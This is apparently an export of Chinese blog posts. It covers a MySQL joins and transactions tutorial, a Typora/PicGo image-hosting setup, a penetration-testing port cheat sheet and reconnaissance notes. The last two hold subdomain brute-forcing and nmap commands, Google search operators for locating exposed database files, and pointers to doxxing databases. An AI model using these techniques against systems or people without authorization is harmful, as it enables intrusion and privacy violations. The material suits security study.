一个学生可以选修多门课程，一门课程也可以供多个学生选择实现: 建立第三张中间表，中间表至少包含两个外键，分别关联两方主键\n对应的SQL脚本:create table student(id int auto_increment primary key comment ‘主键ID’,name varchar(10) comment ‘姓名’,no varchar(10) comment ‘学号’) comment ‘学生表’;insert into student values (null, ‘黛绮丝’, ‘2000100101’),(null, ‘谢逊’,‘2000100102’),(null, ‘殷天正’, ‘2000100103’),(null, ‘韦一笑’, ‘2000100104’);create table course(id int auto_increment primary key comment ‘主键ID’,name varchar(10) comment ‘课程名称’) comment ‘课程表’;insert into course values (null, ‘Java’), (null, ‘PHP’), (null , ‘MySQL’) ,(null, ‘Hadoop’);create table student_course(id int auto_increment comment ‘主键’ primary key,studentid int not null comment ‘学生ID’,courseid int not null comment ‘课程ID’,constraint fk_courseid foreign key (courseid) references course (id),constraint fk_studentid foreign key (studentid) references student (id))comment ‘学生课程中间表’;insert into student_course values (null,1,1),(null,1,2),(null,1,3),(null,2,2),(null,2,3),(null,3,4); \n4.1.3 一对一案例: 用户 与 用户详情的关系关系: 一对一关系，多用于单表拆分，将一张表的基础字段放在一张表中，其他详情字段放在另一张表中，以提升操作效率实现: 在任意一方加入外键，关联另外一方的主键，并且设置外键为唯一的(UNIQUE)\n对应的SQL脚本:create table tb_user(id int auto_increment primary key comment ‘主键ID’,name varchar(10) comment ‘姓名’,age int comment ‘年龄’,gender char(1) comment ‘1: 男 , 2: 女’,phone char(11) comment ‘手机号’) comment ‘用户基本信息表’;create table tb_user_edu(id int auto_increment primary key comment ‘主键ID’,degree varchar(20) comment ‘学历’,major varchar(50) comment ‘专业’,primaryschool varchar(50) comment ‘小学’,middleschool varchar(50) comment ‘中学’,university varchar(50) comment ‘大学’,userid int unique comment ‘用户ID’,constraint fk_userid foreign key (userid) references tb_user(id)) comment ‘用户教育信息表’;insert into tb_user(id, name, age, gender, phone) values(null,’黄渤’,45,’1’,’18800001111’),(null,’冰冰’,35,’2’,’18800002222’),(null,’码云’,55,’1’,’18800008888’),(null,’李彦宏’,50,’1’,’18800009999’);insert into tb_user_edu(id, degree, major, primaryschool, middleschool,university, userid) values(null,’本科’,’舞蹈’,’静安区第一小学’,’静安区第一中学’,’北京舞蹈学院’,1),(null,’硕士’,’表演’,’朝阳区第一小学’,’朝阳区第一中学’,’北京电影学院’,2),(null,’本科’,’英语’,’杭州市第一小学’,’杭州市第一中学’,’杭州师范大学’,3),(null,’本科’,’应用数学’,’阳泉第一小学’,’阳泉区第一中学’,’清华大学’,4); \n4.2 多表查询概述4.2.1 数据准备1). 删除之前 emp, dept表的测试数据2). 执行如下脚本，创建emp表与dept表并插入测试数据– 创建dept表，并插入数据create table dept(id int auto_increment comment ‘ID’ primary key,name varchar(50) not null comment ‘部门名称’)comment ‘部门表’;INSERT INTO dept (id, name) VALUES (1, ‘研发部’), (2, ‘市场部’),(3, ‘财务部’), (4,‘销售部’), (5, ‘总经办’), (6, ‘人事部’);– 创建emp表，并插入数据create table emp(id int auto_increment comment ‘ID’ primary key,name varchar(50) not null comment ‘姓名’,age int comment ‘年龄’,job varchar(20) comment ‘职位’,salary int comment ‘薪资’,entrydate date comment ‘入职时间’,managerid int comment ‘直属领导ID’,dept_id int comment ‘部门ID’)comment ‘员工表’;– 添加外键alter table emp add constraint fk_emp_dept_id foreign key (dept_id) referencesdept(id);INSERT INTO emp (id, name, age, job,salary, entrydate, managerid, dept_id)VALUES(1, ‘金庸’, 66, ‘总裁’,20000, ‘2000-01-01’, null,5),(2, ‘张无忌’, 20, ‘项目经理’,12500, ‘2005-12-05’, 1,1),(3, ‘杨逍’, 33, ‘开发’, 8400,’2000-11-03’, 2,1),(4, ‘韦一笑’, 48, ‘开发’,11000, ‘2002-02-05’, 2,1),(5, ‘常遇春’, 43, ‘开发’,10500, ‘2004-09-07’, 3,1),(6, ‘小昭’, 19, ‘程序员鼓励师’,6600, ‘2004-10-12’, 2,1),(7, ‘灭绝’, 60, ‘财务总监’,8500, ‘2002-09-12’, 1,3),(8, ‘周芷若’, 19, ‘会计’,48000, ‘2006-06-02’, 7,3),(9, ‘丁敏君’, 23, ‘出纳’,5250, ‘2009-05-13’, 7,3),(10, ‘赵敏’, 20, ‘市场部总监’,12500, ‘2004-10-12’, 1,2),(11, ‘鹿杖客’, 56, ‘职员’,3750, ‘2006-10-03’, 10,2),(12, ‘鹤笔翁’, 19, ‘职员’,3750, ‘2007-05-09’, 10,2),(13, ‘方东白’, 19, ‘职员’,5500, ‘2009-02-12’, 10,2),(14, ‘张三丰’, 88, ‘销售总监’,14000, ‘2004-10-12’, 1,4),(15, ‘俞莲舟’, 38, ‘销售’,4600, ‘2004-10-12’, 14,4),(16, ‘宋远桥’, 40, ‘销售’,4600, ‘2004-10-12’, 14,4),(17, ‘陈友谅’, 42, null,2000, ‘2011-10-12’, 1,null);dept表共6条记录，emp表共17条记录。\n4.2.2 概述多表查询就是指从多张表中查询数据。原来查询单表数据，执行的SQL形式为：select * from emp;那么我们要执行多表查询，就只需要使用逗号分隔多张表即可，如： select * from emp , dept; 具体的执行结果如下:\n\n此时,我们看到查询结果中包含了大量的结果集，总共102条记录，而这其实就是员工表emp所有的记录 (17) 与 部门表dept所有记录(6) 的所有组合情况，这种现象称之为笛卡尔积。笛卡尔积: 笛卡尔乘积是指在数学中，两个集合A集合 和 B集合的所有组合情况\n\n而在多表查询中，我们是需要消除无效的笛卡尔积的，只保留两张表关联部分的数据。\n\n在SQL语句中，如何来去除无效的笛卡尔积呢？ 我们可以给多表查询加上连接查询的条件即可。select * from emp , dept where emp.dept_id &#x3D; dept.id;\n\n而由于id为17的员工，没有dept_id字段值，所以在多表查询时，根据连接查询的条件并没有查询到。 \n4.2.3 分类连接查询内连接：相当于查询A、B交集部分数据外连接：左外连接：查询左表所有数据，以及两张表交集部分数据右外连接：查询右表所有数据，以及两张表交集部分数据自连接：当前表与自身的连接查询，自连接必须使用表别名子查询\n4.3 内连接\n内连接查询的是两张表交集部分的数据。(也就是绿色部分的数据)内连接的语法分为两种: 隐式内连接、显式内连接。先来学习一下具体的语法结构。1). 隐式内连接SELECT 字段列表 FROM 表1 , 表2 WHERE 条件 … ;2). 显式内连接SELECT 字段列表 FROM 表1 [ INNER ] JOIN 表2 ON 连接条件 … ;案例:A. 查询每一个员工的姓名 , 及关联的部门的名称 (隐式内连接实现)表结构: emp , dept连接条件: emp.dept_id &#x3D; dept.idselect emp.name , dept.name from emp , dept where emp.dept_id &#x3D; dept.id ;– 为每一张表起别名,简化SQL编写select e.name,d.name from emp e , dept d where e.dept_id &#x3D; d.id;B. 查询每一个员工的姓名 , 及关联的部门的名称 (显式内连接实现) — INNER JOIN …ON …表结构: emp , dept连接条件: emp.dept_id &#x3D; dept.idselect e.name, d.name from emp e inner join dept d on e.dept_id &#x3D; d.id;– 为每一张表起别名,简化SQL编写select e.name, d.name from emp e join dept d on e.dept_id &#x3D; d.id;表的别名:①. tablea as 别名1 , tableb as 别名2 ;②. tablea 别名1 , tableb 别名2 ;注意事项:一旦为表起了别名，就不能再使用表名来指定对应的字段了，此时只能够使用别名来指定字段。\n4.4 外连接外连接分为两种，分别是：左外连接 和 右外连接。具体的语法结构为：1). 左外连接SELECT 字段列表 FROM 表1 LEFT [ OUTER ] JOIN 表2 ON 条件 … ;左外连接相当于查询表1(左表)的所有数据，当然也包含表1和表2交集部分的数据。2). 右外连接SELECT 字段列表 FROM 表1 RIGHT [ OUTER ] JOIN 表2 ON 条件 … ;右外连接相当于查询表2(右表)的所有数据，当然也包含表1和表2交集部分的数据。案例:A. 查询emp表的所有数据, 和对应的部门信息由于需求中提到，要查询emp的所有数据，所以是不能内连接查询的，需要考虑使用外连接查询。表结构: emp, dept连接条件: emp.dept_id &#x3D; dept.idselect e., d.name from emp e left outer join dept d on e.dept_id &#x3D; d.id;select e., d.name from emp e left join dept d on e.dept_id &#x3D; d.id;B. 查询dept表的所有数据, 和对应的员工信息(右外连接)由于需求中提到，要查询dept表的所有数据，所以是不能内连接查询的，需要考虑使用外连接查询。表结构: emp, dept连接条件: emp.dept_id &#x3D; dept.idselect d., e. from emp e right outer join dept d on e.dept_id &#x3D; d.id;select d., e. from dept d left outer join emp e on e.dept_id &#x3D; d.id;注意事项：左外连接和右外连接是可以相互替换的，只需要调整在连接查询时SQL中，表结构的先后顺序就可以了。而我们在日常开发使用时，更偏向于左外连接。\n4.5 自连接4.5.1 自连接查询自连接查询，顾名思义，就是自己连接自己，也就是把一张表连接查询多次。自连接 的查询语法：SELECT 字段列表 FROM 表A 别名A JOIN 表A 别名B ON 条件 … ;而对于自连接查询，可以是内连接查询，也可以是外连接查询。案例：A. 查询员工 及其 所属领导的名字表结构: empselect a.name , b.name from emp a , emp b where a.managerid &#x3D; b.id;B. 查询所有员工 emp 及其领导的名字 emp , 如果员工没有领导, 也需要查询出来表结构: emp a , emp bselect a.name ‘员工’, b.name ‘领导’ from emp a left join emp b on a.managerid &#x3D;b.id;注意事项:在自连接查询中，必须要为表起别名，要不然我们不清楚所指定的条件、返回的字段，到底是哪一张表的字段。\n4.5.2 联合查询对于union查询，就是把多次查询的结果合并起来，形成一个新的查询结果集。SELECT 字段列表 FROM 表A …UNION [ ALL ]SELECT 字段列表 FROM 表B ….; \n对于联合查询的多张表的列数必须保持一致，字段类型也需要保持一致。union all 会将全部的数据直接合并在一起，union 会对合并之后的数据去重。案例:A. 将薪资低于 5000 的员工 , 和 年龄大于 50 岁的员工全部查询出来.当前对于这个需求，我们可以直接使用多条件查询，使用逻辑运算符 or 连接即可。 那这里呢，我们也可以通过union&#x2F;union all来联合查询.select * from emp where salary &lt; 5000union allselect * from emp where age &gt; 50; \n\nunion all查询出来的结果，仅仅进行简单的合并，并未去重select * from emp where salary &lt; 5000unionselect * from emp where age &gt; 50;\n\nunion 联合查询，会对查询出来的结果进行去重处理注意：如果多条查询语句查询出来的结果，字段数量不一致，在进行union&#x2F;union all联合查询时，将会报错。如：\n\n4.6 子查询4.6.1 概述1). 概念SQL语句中嵌套SELECT语句，称为嵌套查询，又称子查询。SELECT * FROM t1 WHERE column1 &#x3D; ( SELECT column1 FROM t2 );子查询外部的语句可以是INSERT &#x2F; UPDATE &#x2F; DELETE &#x2F; SELECT 的任何一个。2). 分类根据子查询结果不同，分为：A. 标量子查询（子查询结果为单个值）B. 列子查询(子查询结果为一列)C. 行子查询(子查询结果为一行)D. 表子查询(子查询结果为多行多列)根据子查询位置，分为：A. WHERE之后B. FROM之后C. SELECT之后 \n4.6.2 标量子查询子查询返回的结果是单个值（数字、字符串、日期等），最简单的形式，这种子查询称为标量子查询。常用的操作符：&#x3D; &lt;&gt; &gt; &gt;&#x3D; &lt; &lt;&#x3D;案例:A. 查询 “销售部” 的所有员工信息完成这个需求时，我们可以将需求分解为两步：①. 查询 “销售部” 部门IDselect id from dept where name &#x3D; ‘销售部’;②. 根据 “销售部” 部门ID, 查询员工信息select * from emp where dept_id &#x3D; (select id from dept where name &#x3D; ‘销售部’);B. 查询在 “方东白” 入职之后的员工信息完成这个需求时，我们可以将需求分解为两步：①. 查询 方东白 的入职日期select entrydate from emp where name &#x3D; ‘方东白’;②. 查询指定入职日期之后入职的员工信息select * from emp where entrydate &gt; (select entrydate from emp where name &#x3D; ‘方东白’); \n4.6.3 列子查询子查询返回的结果是一列（可以是多行），这种子查询称为列子查询。常用的操作符：IN 、NOT IN 、 ANY 、SOME 、 ALL\n\n案例:A. 查询 “销售部” 和 “市场部” 的所有员工信息分解为以下两步:①. 查询 “销售部” 和 “市场部” 的部门IDselect id from dept where name &#x3D; ‘销售部’ or name &#x3D; ‘市场部’;②. 根据部门ID, 查询员工信息select * from emp where dept_id in (select id from dept where name &#x3D; ‘销售部’ or name &#x3D; ‘市场部’);B. 查询比 财务部 所有人工资都高的员工信息分解为以下两步:①. 查询所有 财务部 人员工资select id from dept where name &#x3D; ‘财务部’;select salary from emp where dept_id &#x3D; (select id from dept where name &#x3D; ‘财务部’);②. 比 财务部 所有人工资都高的员工信息select * from emp where salary &gt; all ( select salary from emp where dept_id &#x3D;(select id from dept where name &#x3D; ‘财务部’) );C. 查询比研发部其中任意一人工资高的员工信息分解为以下两步:①. 查询研发部所有人工资select salary from emp where dept_id &#x3D; (select id from dept where name &#x3D; ‘研发部’);②. 比研发部其中任意一人工资高的员工信息select * from emp where salary &gt; any ( select salary from emp where dept_id &#x3D;(select id from dept where name &#x3D; ‘研发部’) ); \n4.6.4 行子查询子查询返回的结果是一行（可以是多列），这种子查询称为行子查询。常用的操作符：&#x3D; 、&lt;&gt; 、IN 、NOT IN案例:A. 查询与 “张无忌” 的薪资及直属领导相同的员工信息 ;这个需求同样可以拆解为两步进行:①. 查询 “张无忌” 的薪资及直属领导select salary, managerid from emp where name &#x3D; ‘张无忌’;②. 查询与 “张无忌” 的薪资及直属领导相同的员工信息 ;select * from emp where (salary,managerid) &#x3D; (select salary, managerid from emp where name &#x3D; ‘张无忌’); \n4.6.5 表子查询子查询返回的结果是多行多列，这种子查询称为表子查询。常用的操作符：IN案例:A. 查询与 “鹿杖客” , “宋远桥” 的职位和薪资相同的员工信息分解为两步执行:①. 查询 “鹿杖客” , “宋远桥” 的职位和薪资select job, salary from emp where name &#x3D; ‘鹿杖客’ or name &#x3D; ‘宋远桥’;②. 查询与 “鹿杖客” , “宋远桥” 的职位和薪资相同的员工信息select * from emp where (job,salary) in ( select job, salary from emp where name &#x3D; ‘鹿杖客’ or name &#x3D; ‘宋远桥’ );B. 查询入职日期是 “2006-01-01” 之后的员工信息 , 及其部门信息分解为两步执行:①. 入职日期是 “2006-01-01” 之后的员工信息select * from emp where entrydate &gt; ‘2006-01-01’;②. 查询这部分员工, 对应的部门信息;select e., d. from (select * from emp where entrydate &gt; ‘2006-01-01’) e leftjoin dept d on e.dept_id &#x3D; d.id ;\n4.7 多表查询案例数据环境准备:create table salgrade(grade int,losal int,hisal int) comment ‘薪资等级表’;insert into salgrade values (1,0,3000);insert into salgrade values (2,3001,5000);insert into salgrade values (3,5001,8000);insert into salgrade values (4,8001,10000);insert into salgrade values (5,10001,15000);insert into salgrade values (6,15001,20000);insert into salgrade values (7,20001,25000);insert into salgrade values (8,25001,30000);在这个案例中，我们主要运用上面所讲解的多表查询的语法，完成以下的12个需求即可，而这里主要涉及到的表就三张：emp员工表、dept部门表、salgrade薪资等级表 。1). 查询员工的姓名、年龄、职位、部门信息 （隐式内连接）表: emp , dept连接条件: emp.dept_id &#x3D; dept.idselect e.name , e.age , e.job , d.name from emp e , dept d where e.dept_id &#x3D; d.id;2). 查询年龄小于30岁的员工的姓名、年龄、职位、部门信息（显式内连接）表: emp , dept连接条件: emp.dept_id &#x3D; dept.idselect e.name , e.age , e.job , d.name from emp e inner join dept d on e.dept_id &#x3D;d.id where e.age &lt; 30;3). 查询拥有员工的部门ID、部门名称表: emp , dept连接条件: emp.dept_id &#x3D; dept.idselect distinct d.id , d.name from emp e , dept d where e.dept_id &#x3D; d.id;4). 查询所有年龄大于40岁的员工, 及其归属的部门名称; 如果员工没有分配部门, 也需要展示出来(外连接)表: emp , dept连接条件: emp.dept_id &#x3D; dept.idselect e., d.name from emp e left join dept d on e.dept_id &#x3D; d.id where e.age &gt; 40 ;5). 查询所有员工的工资等级表: emp , salgrade连接条件 : emp.salary &gt;&#x3D; salgrade.losal and emp.salary &lt;&#x3D; salgrade.hisal– 方式一select e.* , s.grade , s.losal, s.hisal from emp e , salgrade s where e.salary &gt;&#x3D;s.losal and e.salary &lt;&#x3D; s.hisal;– 方式二select e.* , s.grade , s.losal, s.hisal from emp e , salgrade s where e.salarybetween s.losal and s.hisal;6). 查询 “研发部” 所有员工的信息及 工资等级表: emp , salgrade , dept连接条件 : emp.salary between salgrade.losal and salgrade.hisal ,emp.dept_id &#x3D; dept.id查询条件 : dept.name &#x3D; ‘研发部’select e.* , s.grade from emp e , dept d , salgrade s where e.dept_id &#x3D; d.id and (e.salary between s.losal and s.hisal ) and d.name &#x3D; ‘研发部’;7). 查询 “研发部” 员工的平均工资表: emp , dept连接条件 : emp.dept_id &#x3D; dept.idselect avg(e.salary) from emp e, dept d where e.dept_id &#x3D; d.id and d.name &#x3D; ‘研发部’;8). 查询工资比 “灭绝” 高的员工信息。①. 查询 “灭绝” 的薪资select salary from emp where name &#x3D; ‘灭绝’;②. 查询比她工资高的员工数据select * from emp where salary &gt; ( select salary from emp where name &#x3D; ‘灭绝’ );9). 查询比平均薪资高的员工信息①. 查询员工的平均薪资select avg(salary) from emp;②. 查询比平均薪资高的员工信息select * from emp where salary &gt; ( select avg(salary) from emp );10). 查询低于本部门平均工资的员工信息①. 查询指定部门平均薪资select avg(e1.salary) from emp e1 where e1.dept_id &#x3D; 1;select avg(e1.salary) from emp e1 where e1.dept_id &#x3D; 2;②. 查询低于本部门平均工资的员工信息select * from emp e2 where e2.salary &lt; ( select avg(e1.salary) from emp e1 wheree1.dept_id &#x3D; e2.dept_id );11). 查询所有的部门信息, 并统计部门的员工人数select d.id, d.name , ( select count() from emp e where e.dept_id &#x3D; d.id ) ‘人数’ from dept d;12). 查询所有学生的选课情况, 展示出学生名称, 学号, 课程名称表: student , course , student_course连接条件: student.id &#x3D; student_course.studentid , course.id &#x3D;student_course.courseidselect s.name , s.no , c.name from student s , student_course sc , course c wheres.id &#x3D; sc.studentid and sc.courseid &#x3D; c.id ; \n备注: 以上需求的实现方式可能会很多, SQL写法也有很多，只要能满足我们的需求，查询出符合条件的记录即可。\n5. 事务5.1 事务简介**事务是一组操作的集合，它是一个不可分割的工作单位，事务会把所有的操作作为一个整体一起向系统提交或撤销操作请求，即这些操作要么同时成功，要么同时失败。就比如: 张三给李四转账1000块钱，张三银行账户的钱减少1000，而李四银行账户的钱要增加 1000。 这一组操作就必须在一个事务的范围内，要么都成功，要么都失败。**\n正常情况: 转账这个操作, 需要分为以下这么三步来完成 , 三步完成之后, 张三减少1000, 而李四增加1000, 转账成功 : \n\n异常情况: 转账这个操作, 也是分为以下这么三步来完成 , 在执行第三步是报错了, 这样就导致张三减少1000块钱, 而李四的金额没变, 这样就造成了数据的不一致, 就出现问题了。\n\n为了解决上述的问题，就需要通过数据的事务来完成，我们只需要在业务逻辑执行之前开启事务，执行 完毕后提交事务。如果执行过程中报错，则回滚事务，把数据恢复到事务开始之前的状态\n\n注意： 默认MySQL的事务是自动提交的，也就是说，当执行完一条DML语句时，MySQL会立即隐式的提交事务。\n5.2 事务操作数据准备：drop table if exists account;create table account(id int primary key AUTO_INCREMENT comment ‘ID’,name varchar(10) comment ‘姓名’,money double(10,2) comment ‘余额’) comment ‘账户表’;insert into account(name, money) VALUES (‘张三’,2000), (‘李四’,2000); \n5.2.1 未控制事务1). 测试正常情况– 1. 查询张三余额select * from account where name &#x3D; ‘张三’;– 2. 张三的余额减少1000update account set money &#x3D; money - 1000 where name &#x3D; ‘张三’;– 3. 李四的余额增加1000update account set money &#x3D; money + 1000 where name &#x3D; ‘李四’;测试完毕之后检查数据的状态, 可以看到数据操作前后是一致的。 \n\n2). 测试异常情况– 1. 查询张三余额select * from account where name &#x3D; ‘张三’;– 2. 张三的余额减少1000update account set money &#x3D; money - 1000 where name &#x3D; ‘张三’;出错了….– 3. 李四的余额增加1000update account set money &#x3D; money + 1000 where name &#x3D; ‘李四’;我们把数据都恢复到2000， 然后再次一次性执行上述的SQL语句(出错了…. 这句话不符合SQL语法,执行就会报错)，检查最终的数据情况, 发现数据在操作前后不一致了。\n\n5.2.2 控制事务一1). 查看&#x2F;设置事务提交方式SELECT @@autocommit ;SET @@autocommit &#x3D; 0 ;2). 提交事务COMMIT;3). 回滚事务ROLLBACK;注意：上述的这种方式，我们是修改了事务的自动提交行为, 把默认的自动提交修改为了手动提交, 此时我们执行的DML语句都不会提交, 需要手动的执行commit进行提交。\n5.2.3 控制事务二1). 开启事务START TRANSACTION 或 BEGIN ;2). 提交事务COMMIT;3). 回滚事务ROLLBACK;转账案例：– 开启事务start transaction– 1. 查询张三余额select * from account where name &#x3D; ‘张三’;– 2. 张三的余额减少1000update account set money &#x3D; money - 1000 where name &#x3D; ‘张三’;– 3. 李四的余额增加1000update account set money &#x3D; money + 1000 where name &#x3D; ‘李四’;– 如果正常执行完毕, 则提交事务commit;– 如果执行过程中报错, 则回滚事务– rollback;\n5.3 事务四大特性原子性（Atomicity）：事务是不可分割的最小操作单元，要么全部成功，要么全部失败。一致性（Consistency）：事务完成时，必须使所有的数据都保持一致状态。隔离性（Isolation）：数据库系统提供的隔离机制，保证事务在不受外部并发操作影响的独立环境下运行。持久性（Durability）：事务一旦提交或回滚，它对数据库中的数据的改变就是永久的。上述就是事务的四大特性，简称ACID。\n\n5.4 并发事务问题1). 赃读：一个事务读到另外一个事务还没有提交的数据。\n\n比如B读取到了A未提交的数据2). 不可重复读：一个事务先后读取同一条记录，但两次读取的数据不同，称之为不可重复读。\n\n事务A两次读取同一条记录，但是读取到的数据却是不一样的。3). 幻读：一个事务按照条件查询数据时，没有对应的数据行，但是在插入数据时，又发现这行数据已经存在，好像出现了 “幻影”。 \n\n5.5 事务隔离级别为了解决并发事务所引发的问题，在数据库中引入了事务隔离级别。主要有以下几种：\n\n1). 查看事务隔离级别SELECT @@TRANSACTION_ISOLATION;2). 设置事务隔离级别SET [ SESSION | GLOBAL ] TRANSACTION ISOLATION LEVEL { READ UNCOMMITTED |READ COMMITTED | REPEATABLE READ | SERIALIZABLE }注意：事务隔离级别越高，数据越安全，但是性能越低。\n**搬运自柳老师语雀文档**（lzks）\n"},{"title":"利用typora,PicGo实现简单的博客文章管理","url":"/2023/07/28/4/","content":"介绍利用typora，PicGo实现简单的文章管理\n1.typora是一个Markdown格式的编辑器2.PicGo是一个自动上传图片到图床的工具\n参考链接1.PicGo官网\n2.PicGo手册\n搭建图片上传的整体思路9.typora的偏好设置\n10.PicGo图床，将本地图片上传到GitHub网站\n\n搭建流程1.在github里再建一个存储库image1用于放图片2.设置typora偏好设置\n\n3.设置PicGo\n\n\n\n\n\n然后就可以把图片复制粘贴进typora并上传到网上\n\n\n轻松实现了插入图片的需求\n\n\n^^_\nEND"},{"title":"利用typora,PicGo实现简单的博客文章管理","url":"/2023/07/28/a/","content":"介绍利用typora，PicGo实现简单的文章管理\n1.typora是一个Markdown格式的编辑器2.PicGo是一个自动上传图片到图床的工具\n参考链接1.PicGo官网\n2.PicGo手册\n搭建图片上传的整体思路9.typora的偏好设置\n10.PicGo图床，将本地图片上传到GitHub网站\n\n搭建流程1.在github里再建一个存储库image1用于放图片2.设置typora偏好设置\n\n3.设置PicGo\n\n\n\n\n\n然后就可以把图片复制粘贴进typora并上传到网上\n\n\n轻松实现了插入图片的需求\n\n\n^^_\nEND"},{"title":"端口速查","url":"/2023/07/29/aab/","content":"重要端口及服务\n\n\nport\nservice\ndescription\n\n\n\n21\nFTP\nFTP控制端口，检查匿名登录、弱口令\n\n\n22\nSSH\nSSH远程登录协议，检查弱口令\n\n\n23\nTelnet\nTelnet终端仿真协议\n\n\n53\nDNS服务\n\n\n\n80\nWeb\n检查常见Web漏洞及管理后台\n\n\n111\nNFS\n网络文件系统\n\n\n389\nLDAP\n轻型目录访问协议，检查是否存在匿名访问\n\n\n443\nOpenSSL\n检查心脏滴血及Web漏洞\n\n\n445\nSMB\n检查是否存在MS17-010、MS08-067漏洞\n\n\n512\nRexec\n检查远程shell命令及暴力破解\n\n\n873\nRsync\n检查匿名登录、弱口令\n\n\n1433\nSQL Server\n数据库服务\n\n\n1521\nOracle\n数据库服务\n\n\n2049\nNFS\nNFS未授权访问\n\n\n2181\nZookeeper\n分布式协调系统\n\n\n2375\nDocker Remote\nAPI未授权访问\n\n\n3306\nMySQL\n数据库服务\n\n\n3389\nRDP\n远程桌面\n\n\n4848\nGlassFish\n未授权访问\n\n\n5432\nPostgreSQL\n数据库服务\n\n\n5601\nKibana\n开源分析及可视化平台\n\n\n5672\nRabbitMQ\n开源消息队列服务软件\n\n\n5900\nVNC\n远程桌面控制软件，检查弱口令\n\n\n5984\nCouchDB\n数据库服务\n\n\n6379\nRedis\n数据库服务\n\n\n7001\nWeblogic\nWeblogic Console默认端口\n\n\n8000-9090\nWeb\n常见Web端口，运维一般将管理后台开在这些非80端口上\n\n\n8080\nJenkins\n\n\n\n8080\nKubernetes Api Server\n\n\n\n8081\nApache-Flink\n\n\n\n8089\nDruid\n\n\n\n8090\nConfluence\n\n\n\n8095\nAtlassian Crowd\n\n\n\n8161\nActive MQ\n\n\n\n8888\nJupyter Notebook\n\n\n\n8983\nSolr\n\n\n\n9000\nFast-CGI\n对外访问可直接Get shell\n\n\n9060\nWebsephere\n管理端口\n\n\n9092\nKafka\n开源流处理平台\n\n\n9200\nElasticsearch(http)\n全文搜索引擎\n\n\n9300\nElasticsearch(tcp)\n全文搜索引擎\n\n\n10000\nVirualmin&#x2F;Webmin\n服务器虚拟主机管理系统\n\n\n10051\nZabbix\n监控系统\n\n\n11211\nMemcache\n分布式高速缓存系统，检查未授权访问\n\n\n20880\nDubbo\n阿里巴巴开源分布式服务框架\n\n\n27017\nMongoDB\n数据库服务\n\n\n28017\nMongoDB\n数据库服务（统计页面）\n\n\n50030\nHadoop Hive\n\n\n\n50070\nHadoop\n\n\n\n"},{"title":"信息收集","url":"/2023/07/29/ab/","content":"域名什么是域名域名（英语：Domain Name），又称网域，是由一串用点分隔的名字组成的互联网上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）。由于IP地址不方便记忆并且不能显示地址组织的名称和性质，人们设计出了域名，并通过域名系统（DNS，Domain Name System）来将域名和IP地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。（取自百度百科）一级域名：.com  .cn   .net   .org二级域名：.baidu   .google   .scholor\n一个域名对应一个IP，它是网站的唯一标识。\n查找域名在线查找1.域名信息查询–腾讯云2.站长之家3.whois\n\nLINUX查找子域名1.在kali中实现域名扫描\ngit clone https://github.com/lijiejie/subDomainsBrute  #下载克隆\n\n\nls 观察文件\n\n\ncd可退出到根目录\n\npip3 install dnspython==2.2.1 async_timeout #下载python3库cd subDomainsBrute #进入sub文件夹python3 subDomainsBrute.py baidu.com #扫描baidu.com\n\n等待出现结果，生成名为baidu.com的txt文件All Done. 67 found, 59069 scanned in 144.8 seconds.Output file is baidu.com.txt\n\n\nctrl+z 退出\n\n在sub文件目录下cat baidu.com.txt #查看txt文件内容\n\n社工1.社工库（人肉盒） \n\ntelegram、暗网2.谷歌语法\n\nGoogle基本语法在使用Google进行搜索时，我们通常只是简单的输入要搜索的内容,事实上我们还可以加入一些搜索引擎支持的通配符，这样我们就可以使得搜索结果更全面和准确。1、 加号(&quot;+&quot;)：搜索的结果中要包含后面的内容,这里需要注意的是，在“+”号前面要有一个空格。2.减号(“-&quot;)：搜索结果中去除我们写入的内容。3、 波浪号( &quot;~”)：搜索同义词，这样的搜索结果会更多。4、点号(&quot;.&quot;):作用是取代字符，例如&quot;war .3&quot;, 就会搜索到940,000个结果，但是我们如果输入war 3则会有32 ,500,000项结果。5.星号(“*”):包括所有字符,例如搜索war*&quot;,可以搜索到200,000项结果。6、双引号(”&quot;)强调整体，必须包含双引号中完整内容。高级Google搜索语法1. allintext：以网页正文内容中的冒个字符作为搜索条件，例a如&quot;allintext: 天气”。2、allintitle：在网页标题中搜索我们要查找的字符，例a如&quot;allintitle: 谷歌学术”。3、cache：意思是缓存，例如&quot;cache: www. baidu.com”。4. define：意思是词语的定义，例如: &quot;define: 中国”。5. filetype：意思是搜索指定格式的文件，例如filetype: MDB&quot;, 类似于这样的搜索通常都可以直接下载,这样搜索很可能搜索到别人的数据口。6、info:查找指定的网站基本信息，例如: &quot;info: www. baidu.com&quot;。7、link:查看连接的网站。例如&quot;link: www baidu.com&quot;。8、related:返回主页上连接的内容，例如&quot;related: www baidu.com”。9、site:制定一个特定的区域进行搜索, 也就是说如果site后面是一个网站，那么我们得到的内容就是关于这个网站的，例如: &quot;site: www baidu.com”。10、inurl:搜索得到你搜索内容的网址,例如: &quot;inurl: asp&quot;。\n3.领英4.学信网\nDNS什么是DNS域名系统（英文：Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。DNS作用分为：正向解析：根据主机名称（域名）查询IP地址反向解析：IP地址查询主机名称\n\n\nPC机本身自带DNS，协议先DNS再HTTP\nDNS递归和迭代查询\n\n\nPING命令的作用1.用来检测网络的连通情况和分析网络速度2.根据域名得到服务器IP（未做CDN）3.根据ping返回的TTL值判断对方所使用的操作系统、数据包、经过路由数（LINUX&lt;128 WINDOWS&gt;128）\nbyte:数据包大小（字节）time:响应时间，时间越小，响应速度越快TTL:记录在DNS服务器存在时间，是IP协议包的一个值\n\n*LINUX对大小写敏感，可判断服务器类型（更改域名大小写无法访问）\n\nNmap\n\n区分大小写\n\n\n命令：\n1.全面扫描：nmap  -A  192.168.0.122.扫描指定的一个网段nmap  192.168.0.0/24  或者  nmap  192.168.0.1-200（扫描1-200的主机）3.简单扫描该扫描方式可以针对IP或者域名进行扫描，扫描方式迅速，可以很方便地发现目标端口的开放情况及主机在线情况。nmap   192.168.0.124.查看版本号nmap   -V\n\nNmap，也就是Network Mapper，中文为“网络映射器”。Nmap是一款开源的网络探测和安全审核的工具，它的设计目标是快速地扫描大型网络。它是网络管理员必用的软件之一，以及用以评估网络系统保安。(详情见nmap操作说明)\ndig：Kali自带域名查询系统\n命令：# dig 